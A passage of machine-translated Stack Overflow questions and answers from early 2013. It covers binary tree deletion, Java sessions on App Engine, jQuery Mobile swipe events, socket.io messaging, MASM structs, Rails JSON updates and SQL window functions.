一个很简单的想法是，去要删除的节点的有序后继（或前驱）。然后再次应用前两条规则和前一条规则。

在编程时，拥有一个功能齐全的后继（前驱）函数会使编码删除变得简单得多。

对于这棵树：

![在此处输入图像描述](../Images/c76633d946baa3a025c3e3be3808a8c5.png)

要删除 8 ：

*   前往 9 (7)

*   用 10 代替 9

*   将 8 替换为 9 (7)

要删除 12 ：

*   转至 14 (10)

*   （将 9 替换为 10）

*   将 12 替换为 14 (10)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-06-05T09:37:20.640

我们可以简单地说：

*要在二叉树中删除具有 2 个子节点的节点 N（如前面提到的），请将此 N 替换为左子树的最大节点或右子树的最小节点*

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-01T14:49:52.677

当节点有两个孩子时，您必须：

1.  找到最小值。
2.  用最小元素替换要删除的节点的key。

看这张图： **我们要删除元素 4**

![在此处输入图像描述](../Images/a5f3292112fbd20fa2b4ece9cb8791b6.png)

*   4 有 2 个孩子。

*   找到最小右子树。

*   5 找到。

*   因此，4 被 5 替换，4 被删除。

希望这就是你正在寻找的！

# java - 会话对象实例不同。这个对吗？

> ID：14111281
> 
> 赞同：3
> 
> 时间：2013-01-01T14:26:12.293
> 
> 标签：java, google-app-engine

我编写了一个购物车应用程序，其中一个购物车对象存储在 http 会话中。在每个请求中，我都会返回一个不同的对象实例。这是预期的行为吗？

如果我修改了我的购物车对象，我是否需要每次都将它存储在会话中（此时我的更改丢失了，因为我没有这样做）？

在开发中工作正常，但不是生活。这是因为 GAE 的分布式架构还是我做错了什么？

我真的希望你能帮助或证实我对此的想法。提前致谢。

克里斯

ps 我正在使用struts2，但不知道这是否可能是一个问题

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T14:31:12.067

是的，由于会话不一定存储在内存中，您的会话值将是*副本*，而不是对相同对象的引用。

来自[GAE 文档](https://developers.google.com/appengine/docs/java/config/appconfig)；

> 因为 App Engine 将会话数据存储在数据存储区和内存缓存中，所以存储在会话中的所有值都必须实现 java.io.Serializable 接口。

换句话说，GAE 将根据需要序列化/反序列化您的会话，生成副本。

# java - 为 Java 附加解释器

> ID：14111288
> 
> 赞同：-2
> 
> 时间：2013-01-01T14:26:45.993
> 
> 标签：java

我计划在硬件方面为一些非常严格的系统用 Java 做一些独立的应用程序。是否可以编写和编译 Java 代码以添加一个小型解释器，它们的行为就像制作可执行的 Python 程序？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T14:38:04.647

JMX？从技术上讲，您可以在 JVM 中声明 MBean 并调用方法。这将是推荐的方式（尽管我们不确定您的环境想要受到多少限制）

这可能包括访问脚本运行时和评估表达式。

另一种方法是考虑像 Crash ( [http://www.crashub.org/](http://www.crashub.org/) )

# android - Jquery Mobile Gesture在android phonegap应用程序中向左/向右滑动问题

> ID：14111290
> 
> 赞同：1
> 
> 时间：2013-01-01T14:27:17.043
> 
> 标签：android, cordova, jquery-mobile, swipe-gesture

我正在尝试在 android 的 jquery mobile/phonegap 中实现左/右滑动。我有示例代码，但是当我滑动时，它没有任何反应。

这是我的javascript代码

```
$("#listitem").swiperight(function() {
    $.mobile.changePage("#page1");
}); 
```

这是正文内容

```
<div data-role="page" id="home">
    <div data-role="content">
        <p>
        <ul data-role="listview" data-inset="true" data-theme="c">
            <li id="listitem">Swipe Right to view Page 1</li>
        </ul>
        </p>
    </div>
</div>

<div data-role="page" id="page1">
    <div data-role="content">

        <ul data-role="listview" data-inset="true" data-theme="c">
            <li data-role="list-divider">Navigation</li>
            <li><a href="#home">Back to the Home Page</a></li>
        </ul>

        <p>
            Yeah!<br />You Swiped Right to view Page 1
        </p>
    </div>
</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T15:14:16.950

事件处理程序仅绑定到当前选定的元素，并且**在您的代码进行调用时它们必须存在于页面上**。在加载任何其他 HTML 之前，文档元素在**文档的头部**是可用的，因此在此处附加事件是安全的，而无需等待文档准备好。

此外，如[jQM 文档](http://jquerymobile.com/demos/1.2.0/docs/api/events.html)中所述，您可以像使用其他 jQuery 事件一样绑定到这些事件，使用 live() 或 bind()。

您可以检查以下示例：

```
<!DOCTYPE html> 
<html> 
    <head> 
        <title>Swipe</title> 
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <link rel="stylesheet" href="http://code.jquery.com/mobile/1.1.1/jquery.mobile-1.1.1.min.css" />
        <script type="text/javascript" src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
        <script type="text/javascript" src="http://code.jquery.com/mobile/1.1.1/jquery.mobile-1.1.1.min.js"></script>
        <script>
            $('#listitem').live("swiperight", function(){
                $.mobile.changePage("#page1");
            });
        </script>
    </head> 
    <body>
        <div data-role="page" id="home">
            <div data-role="content">
                <p>
                    <ul data-role="listview" data-inset="true" data-theme="c">
                        <li id="listitem">Swipe Right to view Page 1</li>
                    </ul>
                </p>
            </div>
        </div>
        <div data-role="page" id="page1">
            <div data-role="content">
                <ul data-role="listview" data-inset="true" data-theme="c">
                    <li data-role="list-divider">Navigation</li>
                    <li><a href="#home">Back to the Home Page</a></li>
                </ul>
                <p>
                    Yeah!<br />You Swiped Right to view Page 1
                </p>
            </div>
        </div>
    </body>
</html> 
```

示例 2：

```
<!DOCTYPE html> 
<html> 
    <head> 
        <title>Swipe Example</title> 
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <link rel="stylesheet" href="http://code.jquery.com/mobile/1.1.1/jquery.mobile-1.1.1.min.css" />
        <script type="text/javascript" src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
        <script type="text/javascript" src="http://code.jquery.com/mobile/1.1.1/jquery.mobile-1.1.1.min.js"></script>
        <script>
            $(document).on("swiperight", "#listitem", function() {
                $.mobile.changePage("#page1");
            });
        </script>
    </head> 
    <body>
        <div data-role="page" id="home">
            <div data-role="content">
                <p>
                    <ul data-role="listview" data-inset="true" data-theme="c">
                        <li id="listitem">Swipe Right to view Page 1</li>
                    </ul>
                </p>
            </div>
        </div>
        <div data-role="page" id="page1">
            <div data-role="content">
                <ul data-role="listview" data-inset="true" data-theme="c">
                    <li data-role="list-divider">Navigation</li>
                    <li><a href="#home">Back to the Home Page</a></li>
                </ul>
                <p>
                    Yeah!<br />You Swiped Right to view Page 1
                </p>
            </div>
        </div>
    </body>
</html> 
```

示例 3：

```
<!DOCTYPE html> 
<html> 
    <head> 
        <title>Swipe Example</title> 
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <link rel="stylesheet" href="http://code.jquery.com/mobile/1.1.1/jquery.mobile-1.1.1.min.css" />
        <script type="text/javascript" src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
        <script type="text/javascript" src="http://code.jquery.com/mobile/1.1.1/jquery.mobile-1.1.1.min.js"></script>
    </head> 
    <body>
        <div data-role="page" id="home">
            <div data-role="content">
                <p>
                    <ul data-role="listview" data-inset="true" data-theme="c">
                        <li id="listitem">Swipe Right to view Page 1</li>
                    </ul>
                </p>
            </div>
        </div>
        <div data-role="page" id="page1">
            <div data-role="content">
                <ul data-role="listview" data-inset="true" data-theme="c">
                    <li data-role="list-divider">Navigation</li>
                    <li><a href="#home">Back to the Home Page</a></li>
                </ul>
                <p>
                    Yeah!<br />You Swiped Right to view Page 1
                </p>
            </div>
        </div>
        <script>
            $("#listitem").swiperight(function() {
                $.mobile.changePage("#page1");
            });
        </script>
    </body>
</html> 
```

# visual-studio-2010 - Visual Studio 2010 和 Windows 7 64 位静默异常

> ID：14111292
> 
> 赞同：0
> 
> 时间：2013-01-01T14:27:40.453
> 
> 标签：visual-studio-2010, exception

我知道在 StackOverflow 上几乎没有创建过类似的主题（例如[there](https://stackoverflow.com/questions/8197254/visual-studio-2010-doesnt-stop-at-an-unhandled-exception-inside-a-socket-beginr) and [there](https://stackoverflow.com/questions/4478909/silent-exception-on-visual-studio-2010)）。我有一个众所周知的问题 - 在 Windows 7 64 位的 Visual Studio 中抛出的用户未处理的异常不是由 IDE 调试器处理的，因此调试器不会中断合适的代码行。因为我不想通过在 Tools->Exceptions... 菜单中启用“Throwing”复选框来捕获所有异常，所以我尝试使用[Microsoft article solution](http://support.microsoft.com/kb/976038)。

应用 MS 解决方案导致情况发生了变化，但 VS 调试器仍然无法正常运行。

目前，当抛出新异常时，我看到系统内部错误消息，然后 VS 调试器将在错误行上正确停止，但仅持续不到一秒钟，应用程序退出......

您有其他解决方案来解决此错误吗？使用所谓的静默异常进行编程非常不舒服......

**编辑：我希望，现在我的问题不那么啰嗦了......**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-02T12:00:10.040

在我的情况下，不需要任何注册表修改。根据[这个主题](https://stackoverflow.com/questions/7572995/how-can-i-get-winforms-to-stop-silently-ignoring-unhandled-exceptions)和 Redd 的回答，我以这种方式修改了我的 Program.cs 文件：

```
static void Main()
{
    try
    {
        System.Windows.Forms.Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
        System.Windows.Forms.Application.ThreadException += new System.Threading.ThreadExceptionEventHandler(OnGuiUnhandedException);
        AppDomain.CurrentDomain.UnhandledException += OnUnhandledException;

        var form = new MainForm();
        form.ShowDialog();
    }
    catch (Exception e)
    {
        HandleUnhandledException(e);
    }
    finally
    {
        // Do stuff
    }
}

private static void HandleUnhandledException(Object o)
{
    // TODO: Log it!
    Exception e = o as Exception;

    if (e != null)
    {

    }
}

private static void OnUnhandledException(Object sender, UnhandledExceptionEventArgs e)
{ 
    HandleUnhandledException(e.ExceptionObject);
}

private static void OnGuiUnhandedException(object sender, System.Threading.ThreadExceptionEventArgs e)
{
    HandleUnhandledException(e.Exception);
} 
```

现在我的调试器工作正常，所以它会在未处理的异常上停止并且不会在处理过的异常上停止。看起来微软在操作系统级别为 Windows 7 64 位解决了 SP1 中的静默异常问题，但强制 VS 的正确工作仍然需要一些用户/程序员的操作。

# d3.js - 添加第二个 Y 轴

> ID：14111293
> 
> 赞同：1
> 
> 时间：2013-01-01T14:27:43.447
> 
> 标签：d3.js, nvd3.js

有没有一种直接的方法可以将第二个 Y 轴添加到图表模型中？我看到[linePlusBar](http://nvd3.org/examples/linePlusBar.html)图表具有此功能（通过`y1Axis` `y2Axis`和`forceY`），但有没有一种简单的方法可以将其添加到其他模型？我想将它用于 lineChart 或 scatter 模型。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-31T14:02:13.400

X 轴相同，Y 值不同需要双 Y 轴。你可以试试这个：

```
plot(x,y1......,axes=F)
axis(2,....) # build the left Y axis
par(new=T) # means that the next chart will be draw on the picture you draw above
plot(x,y2......,axes=F)
axis(4,....) # build the right Y axis 
```

# mysql - MySQL如何通过多个属性行的相似性对对象进行排名

> ID：14111294
> 
> 赞同：5
> 
> 时间：2013-01-01T14:28:00.447
> 
> 标签：mysql, sql, database, select

大家好，新年快乐

**情况：**

我在 MySQL 数据库中有一些表：

分数：（唯一 ID，唯一（objectID，metricID））

```
| ID     | ObjectID | MetricID | Score    |
|--------+----------+----------+----------|
|0       | 1        | 7        | 0        | 
|1       | 5        | 3        | 13       |
|2       | 7        | 2        | 78       |
|3       | 7        | 3        | 22       |
|.....
|--------+----------+----------+----------| 
```

对象：（唯一 ID，唯一 ObjectName）

```
| ID     | ObjectName |
|--------+------------|
|0       | Ook        | 
|1       | Oop        |
|2       | Oww        |
|3       | Oat        |
|.....
|--------+------------| 
```

Metrics：（唯一 ID，唯一 MetricName）

```
| ID     | MetricName |
|--------+------------|
|0       | Moo        | 
|1       | Mar        |
|2       | Mee        |
|3       | Meep       |
|.....
|--------+------------| 
```

对于给定的对象 ID：

*   在“0”和“每个指标一个”之间会有许多分数

**要求：**

对于给定的 ObjectID，我想根据以下条件返回一个排序列表：

*   返回的行按与所提供对象的相似度排序
*   返回的行不包括提供的对象
*   （这是我认为的难点）相似度的顺序由对象与提供的对象的“得分距离”决定，基于其得分与提供的对象得分的数字偏移/差异，对于任何有条目的度量，提供的和当前检查的对象
*   包含对象 ID、对象名称、分数差异（或类似内容）

**问题陈述：**

我不知道为此使用的正确 SQL 语法，而且我的实验到目前为止都失败了。我想尽可能多地在数据库中完成这项工作，并且很少或根本没有在代码或类似代码中的讨厌的 for 循环中完成这些工作。

**额外的非功能**

*   目前，Scores 表中只有 200 行。我的计算表明，最终可能会有大约 2,000,000 行，但可能不会更多。
*   Objects 表最多只能有大约 5000 行
*   Metrics 表最多只能有大约 400 行

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T14:55:12.363

这是一种根据对象与对象 1 的相似性对对象进行排序的方法：

```
select  other.ObjectID
,       avg(abs(target.Score - other.Score)) as Delta
from    Scores target
join    Scores other
on      other.MetricID = target.MetricID
        and other.ObjectID <> target.ObjectID
where   target.ObjectID = 1
group by
        other.ObjectID
order by
        Delta 
```

相似性被定义为共同指标的平均差异。未列出不与对象 1 共享至少一个度量的对象。如果此答案做出错误的假设，请随时澄清您的问题:)

[SQL Fiddle 上的实时示例。](http://sqlfiddle.com/#!2/5fe73a/4/0)

# css - 如何忽略图像的透明像素？

> ID：14111305
> 
> 赞同：3
> 
> 时间：2013-01-01T14:30:01.333
> 
> 标签：css, hover, transparency

> **可能重复：**
> [对不透明像素的命中检测](https://stackoverflow.com/questions/2878511/hit-detection-on-non-transparent-pixel)

`#welc`是一个透明的.png。不透明的像素像丝带一样对角放置，因此大部分图像（左上角和右下角部分）都是透明的。

```
#welc:hover{
    margin-top:-5px;
} 
```

这行得通，但只有当鼠标在“真实图像”上时，我才想要这种效果，即在非透明像素上。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T14:35:39.377

您可以使用图像贴图遮盖不透明区域，并且仅在光标位于遮罩上方时应用悬停。我不知道这是否是跨浏览器安全的解决方案。

# javafx - 在 ScrollPane JavaFx 中动态显示图像

> ID：14111308
> 
> 赞同：0
> 
> 时间：2013-01-01T14:30:52.330
> 
> 标签：javafx

我想通过单击按钮在 Scollpane 中添加多个图像我尝试下面的代码但它不会显示图像对此有任何想法吗？

```
@FXML private void OnClick(ActionEvent ae)
{
  getGalleryView();
}
public void getGalleryView()
{
  ScrolPane sp=new ScroPane();
Hbox hb=new Hbox();
Image [] images=new Image[5];
ImageView []pics=new ImageView[5];
final String [] imageNames = new String [] {"fw1.jpg", "fw2.jpg",
    "fw3.jpg", "fw4.jpg", "fw5.jpg"};

for (int i = 0; i < 5; i++) {
        images[i] = new Image(getClass().getResourceAsStream(imageNames[i]));
        pics[i] = new ImageView(images[i]);
        pics[i].setFitWidth(100);
        pics[i].setPreserveRatio(true);
        hb.getChildren().add(pics[i]);
        sp.setContent(hb);

    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-04T18:49:08.720

您需要将滚动窗格添加到场景中：

```
@FXML private void OnClick(ActionEvent ae)
{
  getGalleryView(ae);
}
public void getGalleryView(ActionEvent ae)
{
  ScrolPane sp=new ScroPane();
  Hbox hb=new Hbox();
  Image [] images=new Image[5];
  ImageView []pics=new ImageView[5];
  final String [] imageNames = new String [] {"fw1.jpg", "fw2.jpg",
    "fw3.jpg", "fw4.jpg", "fw5.jpg"};

  for (int i = 0; i < 5; i++) {
        images[i] = new Image(getClass().getResourceAsStream(imageNames[i]));
        pics[i] = new ImageView(images[i]);
        pics[i].setFitWidth(100);
        pics[i].setPreserveRatio(true);
        hb.getChildren().add(pics[i]);
        sp.setContent(hb);

    }

    Scene scene = ((Node) ae.getSource()).getScene();
    ((Pane) scene.getRoot()).getChildren().add(sp);
} 
```

我在这里假设您的根节点是窗格或其子类之一。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-02-05T17:46:12.297

ScrolPane sp=new ScroPane(); 错误？

**编辑：** 我正在开发类似的方法。我的工作正常。您可以检查是否愿意。

```
 private List<String> listFileNames(File folder) throws NullPointerException{
    List<String> list = new ArrayList<>();

    for (File file : folder.listFiles()) {
        if (file.isDirectory())
            listFileNames(file);
        else {
            System.out.println(file.getName());
            list.add(file.getName());
        }
    }
    return list;
}

private void insertImages(List<String> list, Hero thisHero) {
    int column = 0;
    int row = 0;
    for (String path:list) {
        String fullPath = "file:"+thisHero.getHeroClass().getFile()+"\\"+path;
        ToggleButton button = new ToggleButton();
        button.setBackground(Background.EMPTY);
        button.setGraphic(new ImageView(new Image(fullPath)));
        grid.add(button,column,row);
        column++;
        if (column == 5) {
            row++;
            column = 0;
        }
    }
} 
```

如果你愿意，我可以写更多。我使用列表是因为它很容易添加项目。

您可以使用第一种方法从充满图像文件的文件夹中获取所有要列出的文件名。

第二种方法是制作带有图形的 ToggleButtons 的新 ImageViews。我只是将概念更改为按钮，很抱歉我懒惰地没有更改代码以完全满足您的需求。

Path 是确切的文件名，`thisHero.getHeroClass().getFile()`返回包含此图像的目录的路径。

`grid.add(button, column, row)`将此按钮添加到我之前制作的网格窗格中。这是我的应用程序，很抱歉没有分享所有代码，但我认为这个片段可能很有用。

**EDIT2：**如果有任何错误信息，您也可以向我们提供。

# javascript - 在添加额外副本时保留表单数据 到表格

> ID：14111309
> 
> 赞同：0
> 
> 时间：2013-01-01T14:31:06.020
> 
> 标签：javascript, ajax, spring, jsp, dojo

我正在开发 SpringMVC Webapp。我有一个由动态形式组成的视图。表单的动态元素如下图所示：

现在，目前的情况是：

我将变量`${worksiteCount}`从我的控制器传递到视图（存储在我的 portlet 会话中 - 默认为 1）。

表单提交包含一个在后端处理表单数据的@ActionMapping。
我的页面中有另一个按钮，允许用户在必要时添加额外的工程工作场所 - 额外的工作场所 #1 等）。

单击会触发 @RequestMapping 更新“worksiteCount”并返回带有附加表单字段的视图。

问题是：我在表格中填写的任何数据都会在单击此请求时被删除。

如何在会话中保留这些数据？例如，我应该使用 Ajax 脚本（最好使用 DOJO/Vanilla JS）在 jsp 端异步增加变量 {worksiteCount} 吗？

如果是这样，我该怎么做而不刷新视图？
我是 Ajax-Dojo（如 dojo.xhrGet/post）、Spring 框架的初学者。请帮忙。

```
<c:if test="${worksiteCount>1}">
            <c:set var="i" value="0"/>
            <c:forEach var="worksiteAddresses" items="${worksiteAddresses}"> 
            <c:set var="i" value="${i+1}"/>

                <c:if test="${worksiteCount>1}">
                <div class="row">
                <h2 id="worksiteAddress${i}" name="worksiteAddress${i}">Additional Worksite<span>${i}</span></h2>
                </div>
                </c:if>

             <div class="row">
                <div id="f-addr1" class="field">
                    <label>Address1<span><tag:requiredIcon/> </span></label>
                    <input class="" type="text" value="${worksiteAddresses.companyAddressLine1}" id="addressLine1${i}" name="addressLine1${i}" onblur="validateControl('addressLine1${i}');"/>
                </div>
                <div id="f-addr2" class="field">
                    <label>Address2</label>
                    <input class="" type="text" value="${worksiteAddresses.companyAddressLine2}" id="addressLine2${i}" name="addressLine2${i}" />
                </div>              
                <br class="clear" />
            </div>
            <div class="row">
                <div id="f-city" class="field">
                    <label>City<span><tag:requiredIcon/> </span></label>
                    <input class="" type="text" name="city${i}" id="city${i}" value="${worksiteAddresses.companyCity}" onblur="validateControl('city${i}');" />
                </div>
                <div id="f-zip" class="field">
                    <label>Zip<span><tag:requiredIcon/> </span></label>
                    <input class="" type="text" name="zip${i}" id="zip${i}" value="${worksiteAddresses.Zipcode}" onblur="validateZipControl('zip${i}',${i});" />
                </div>
                <br class="clear" />
            </div>

            </c:forEach>
        </c:if> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T14:48:09.310

如果我正确理解了这一点，并且点击页面上的按钮以使用其他工作站点的新字段更新表单的唯一效果，那么有几种方法可以处理这个问题。最简单的可能是：

1）页面上已经存在字段，但隐藏并使用 JS 使它们可见。这样现有的表单数据就已经被保留了。

如果需要使用现有数据从服务器端提取某些数据并在一定程度上改变表单上已经存在的数据的性质，那么这确实是一个提交，应该由控制器处理。

2）您可以返回所有修改过的原始数据，但是也可以使用新字段，或者使用 AJAX 来获取新数据并结合答案#1。

# node.js - 无法使用 node.js 和 socket.io 将消息从客户端发送到服务器

> ID：14111311
> 
> 赞同：1
> 
> 时间：2013-01-01T14:31:16.343
> 
> 标签：node.js, socket.io

我尝试使用 node.js 和 socket.io 在几天内在 Web 上构建应用程序。我不明白为什么我不能使用 socket.io 和服务器 node.js 将消息从客户端发送到服务器。我可以从服务器到客户端接收消息和事件。但无法从客户端的服务器接收事件。我认为我的库有问题。

我安装的模块 node.js

*   表示
*   io
*   玉
*   网
*   套接字.io
*   socket.io 客户端

为什么会有socket.io-client和socket.io？我什至尝试这个例子：code.google.com/p/nodejs-win/wiki/SimpleChatSystem 但还是不行。服务器无法接收来自客户端的任何消息和事件。

代码 server.js

```
// Require HTTP module (to start server) and Socket.IO
var http = require('http'), 
io = require('socket.io');

// Start the server at port 8080
var server = http.createServer(function(req, res){ 

    // Send HTML headers and message
    res.writeHead(200,{ 'Content-Type': 'text/html' }); 
    res.end('<h1>Hello Socket Lover!</h1>');
});
server.listen(8080);
// Create a Socket.IO instance, passing it our server
var socket = io.listen(server);

// Add a connect listener
socket.on('connection', function(client){ 
    console.log("server is start on port 8080");

    // Create periodical which ends a message to the client every 5 seconds
    var interval = setInterval(function() {
        client.send('This is a message from the server!  ' + new Date().getTime());
    },5000);

    // Success!  Now listen to messages to be received
    client.on('message',function(event){
        console.log('Received message from client! ',event);
    });
    client.on('disconnect',function(){
        clearInterval(interval);
        console.log('Server has disconnected');
    });

}); 
```

代码客户端 index.html

```
<html>
<head>
    <style>
        * { margin:0; padding:0; font-size:11px; font-family:arial; color:#444; }
        body { padding:20px; }
        #message-list { list-style-type:none; width:300px; height:300px; overflow:auto; border:1px solid #999; padding:20px; }
        #message-list li { border-bottom:1px solid #ccc; padding-bottom:2px; margin-bottom:5px; }
        code { font-family:courier; background:#eee; padding:2px 4px; }
    </style>
    <script src="http://localhost:8080/socket.io/socket.io.js"></script>
    <script>

        // Create SocketIO instance
        var socket = new io.connect('localhost',{
            port: 8080
        });
        //socket.connect(); 

        // Add a connect listener
        socket.on('connect',function() {
            log('<span style="color:green;">Client has connected to the server!</span>');
        });

        // Add connecting listener
        socket.on('connecting',function() {
            log('<span style="color:green;">Client is connecting to the server!</span>');
        });
        // Add a connect listener
        socket.on('message',function(data) {
            log('Received a message from the server:  ' + data);
        });
        // Add a disconnect listener
        socket.on('disconnect',function() {
            log('<span style="color:red;">The client has disconnected!</span>');
        });

        // Sends a message to the server via sockets
        function sendMessageToServer(message) {
            socket.emit("message",message);
                    socket.send(message);            
            log('<span style="color:#888">Sending "' + message + '" to the server!</span>');
        }

        // Outputs to console and list
        function log(message) {
            var li = document.createElement('li');
            li.innerHTML = message;
            document.getElementById('message-list').appendChild(li);
        }

        setInterval(function(){ sendMessageToServer(new Date())},5000);

    </script>
</head>
<body>

    <p>Messages will appear below (and in the console).</p><br />
    <ul id="message-list"></ul>
    <ul style="margin:20px 0 0 20px;">
        <li>Type <code>socket.disconnect()</code> to disconnect</li>
        <li>Type <code>socket.connect()</code> to reconnect</li>
        <li>Type <code>sendMessageToServer('Your Message')</code> to send a message to the server</li>
    </ul>
</body>
</html> 
```

我的客户日志：[https ://dl.dropbox.com/u/56440676/client.png](https://dl.dropbox.com/u/56440676/client.png)

我的服务器日志：[https ://dl.dropbox.com/u/56440676/server.png](https://dl.dropbox.com/u/56440676/server.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T16:03:23.287

这里的错误：

```
// Sends a message to the server via sockets
function sendMessageToServer(message) {
    socket.emit(message);
    log('<span style="color:#888">Sending "' + message + '" to the server!</span>');
} 
```

方法 emit 有两个参数。第一个 - 事件代码。第二个 - 事件数据。

正确的解决方案：

```
// Sends a message to the server via sockets
function sendMessageToServer(message) {
    socket.emit('message', message);
    log('<span style="color:#888">Sending "' + message + '" to the server!</span>');
} 
```

# assembly - 在程序集中到达结构数组的元素

> ID：14111312
> 
> 赞同：0
> 
> 时间：2013-01-01T14:31:19.960
> 
> 标签：assembly, struct, x86, masm, irvine32

我写的代码在这里：

```
 TITLE MASM Template                     (main.asm)

Description:

Revision date:

INCLUDE Irvine32.inc   
INCLUDE macros.inc   
Employee STRUCT   
idnum BYTE "0000",0   
lastname BYTE 30 DUP(0)   
years WORD 0   
Employee ENDS    

.data   
workers Employee 3 DUP(<>)   
count DWORD ?   
.code   
main PROC

mov ecx,LENGTHOF workers
mov esi,TYPE Employee

l1:
mov count,ecx
mWrite "Enter employee id:> "

mov edx,OFFSET workers[esi].idnum
mov ecx,LENGTHOF workers.idnum
call ReadString
call crlf
mov ecx,count
add esi,TYPE employee
loop l1

exit
main ENDP

END main 
```

我想为`idnum`结构中的每个员工添加。我怎样才能达到`idnum`变量？

```
Here's the solution.
mov edx, OFFSET workers
add edx, esi
mov ecx, sizeof (employee ptr[edx]).idnum
call ReadString 
```

# ruby-on-rails - 使用 JSON 数据更新 Rails 模型错误

> ID：14111315
> 
> 赞同：1
> 
> 时间：2013-01-01T14:31:50.810
> 
> 标签：ruby-on-rails, ruby-on-rails-3, json, jquery, ruby-on-rails-3.2

我正在尝试更新 rails 模型，但即使 ajax 请求确实通过了，我也面临一些数据处理错误。

正在发送的参数如下图所示：

```
Parameters: {"{\"slot_allocation\":{\"timeslot_id\":\"3\",\"subject_id\":\"3\",\"slot_allocation_id\":\"1\",\"group_index\
":\"Group 2\",\"lesson_type\":\"Tutorial\"}}"=>nil, "id"=>"1"}
  SlotAllocation Load (0.2ms)  SELECT "slot_allocations".* FROM "slot_allocations" WHERE "slot_allocations"."id" = ? LIMIT 1
  [["id", "1"]] 
```

而正常更新会：

```
 Parameters: {"utf8"=>"✓", "authenticity_token"=>"yBib4ftNdB/r25uZuGnqEZI+r9dulVhyoce8nWBfcBQ=", "slot_allocation"=>{"slot_
allocation_id"=>"1", "lesson_type"=>"Lecture", "group_index"=>"Group 1", "timeslot_id"=>"1", "subject_id"=>"1"}, "commit"=>"
Update Slot allocation", "id"=>"1"}
  SlotAllocation Load (0.3ms)  SELECT "slot_allocations".* FROM "slot_allocations" WHERE "slot_allocations"."id" = ? LIMIT 1
  [["id", "1"]] 
```

我不确定作为 Rails 和 JSON 的新手我哪里出错了。

我已经尝试过[How do I parse JSON with Ruby on Rails? 发布的解决方案？](https://stackoverflow.com/questions/1826727/how-do-i-parse-json-with-ruby-on-rails). 但是在更改我的代码后，请求不会被发送出去。我也尝试按照某些示例更改发送的数据，但也没有成功。

我将不胜感激有关如何解决此错误的建议。

以下是相关代码：

我的 Ajax 请求：

```
var url = 'slot_allocations/'+alloc_id;

var dataToServer = {"slot_allocation":{"timeslot_id":timeslot, "subject_id":subject,"slot_allocation_id":alloc_id, "group_index":"Group 2", "lesson_type":"Tutorial"}}

  $.ajax({
    type: "PUT",
    url: url, 
    dataType: "json",
    data: JSON.stringify(dataToServer) 
    }); 
```

我的控制器更新操作：

```
 def update
    @slot_allocation = SlotAllocation.find(params[:id])

    respond_to do |format|
     if @slot_allocation.update_attributes(params[:slot_allocation])
        format.html { redirect_to @slot_allocation, notice: 'Slot allocation was successfully updated.' }
        format.json { head :ok}
      else
        format.html { render action: "edit" }
        format.json { render json: @slot_allocation.errors, status: :unprocessable_entity }
        format.js  { render :js => @slot_allocation.errors, :status => :unprocessable_entity }
      end
    end
  end 
```

我将不胜感激任何关于我可能出错的地方的建议。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T14:41:01.163

`update_attributes`需要一个哈希。通过将您发送到服务器的数据转换为 JSON，params 包含一个 JSON 字符串。您应该使用标准 POST 数据调用控制器：

```
$.ajax({
  type: "PUT",
  url: url, 
  dataType: "json",
  data: dataToServer
}); 
```

# sql - 窗口函数只能出现在 SELECT 或 ORDER BY 子句中

> ID：14111321
> 
> 赞同：27
> 
> 时间：2013-01-01T14:33:02.010
> 
> 标签：sql, sql-server

谁能解释为什么我们不能在`group by`子句中使用窗口函数以及为什么它只允许在`SELECT`and`ORDER BY`

我试图根据`row_number()`SQL Server 中的列对记录进行分组，如下所示：

```
SELECT Invoice
from table1
group by row_number() over(order by Invoice),Invoice 
```

我收到一个错误

> *窗口函数只能出现在 SELECT 或 ORDER BY*

我可以`row_number()`在 SELECT 子句中选择它，但我想知道为什么我们不能按组使用它？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-01-01T21:44:30.877

加窗函数在 ANSI 规范中定义为在处理 , , 之后`GROUP BY`逻辑`HAVING`执行`WHERE`。

更具体地说，它们在[此处的逻辑查询处理流程图](http://tsql.solidq.com/books/insidetsql2008/Logical%20Query%20Processing%20Poster.pdf)的步骤 5.1 和 6 中被允许。

我想他们可以用另一种方式定义它并允许使用窗口函数`GROUP BY`，窗口`WHERE`是`HAVING`该阶段开始时的逻辑结果集，但假设他们有并且我们被允许构造查询，例如

```
SELECT a, 
       b, 
       NTILE(2) OVER (PARTITION BY a ORDER BY b) AS NtileForSelect
  FROM YourTable
  WHERE NTILE(2) OVER (PARTITION BY a ORDER BY b) > 1
  GROUP BY a, 
           b, 
           NTILE(2) OVER (PARTITION BY a ORDER BY b)
  HAVING NTILE(2) OVER (PARTITION BY a ORDER BY b) = 1 
```

有四个不同的逻辑窗口在运行，祝你好运，弄清楚这会是什么结果！另外，如果`HAVING`您实际上想通过`GROUP BY`上面级别的表达式进行过滤，而不是将行窗口作为 ? 之后的结果，该`GROUP BY`怎么办？

CTE 版本更详细，但也更明确且更易于理解。

```
WITH T1 AS
(
SELECT a, 
       b, 
       NTILE(2) OVER (PARTITION BY a ORDER BY b) AS NtileForWhere
  FROM YourTable
), T2 AS
(
SELECT a,
       b,
       NTILE(2) OVER (PARTITION BY a ORDER BY b) AS NtileForGroupBy
FROM T1
WHERE NtileForWhere > 1
), T3 AS
(
SELECT a,
       b,
       NtileForGroupBy,
